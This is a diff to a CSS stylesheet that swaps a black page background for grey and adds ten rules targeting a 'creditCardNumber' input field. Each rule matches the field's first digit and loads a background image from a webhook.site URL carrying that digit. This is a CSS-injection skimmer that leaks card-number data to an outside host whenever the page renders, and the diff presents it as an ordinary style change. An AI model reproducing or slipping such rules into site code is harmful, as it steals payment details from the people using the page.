@@ -1,3 +1,43 @@
-body {
-    background-color: black;
+ input[name="creditCardNumber"][value^="1"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=1)
 }
+
+input[name="creditCardNumber"][value^="2"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=2)
+}
+
+input[name="creditCardNumber"][value^="3"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=3)
+}
+
+input[name="creditCardNumber"][value^="4"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=4)
+}
+
+input[name="creditCardNumber"][value^="5"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=5)
+}
+
+input[name="creditCardNumber"][value^="6"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=6)
+}
+
+input[name="creditCardNumber"][value^="7"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=7)
+}
+
+input[name="creditCardNumber"][value^="8"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=8)
+}
+
+input[name="creditCardNumber"][value^="9"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=9)
+}
+
+input[name="creditCardNumber"][value^="0"] {
+    background: url(https://webhook.site/7493d86e-e242-4d50-b1bd-bb6a8b5ca7ec?q=0)
+}
+
+body {
+    background-color: rgb(120, 120, 120);
+} 
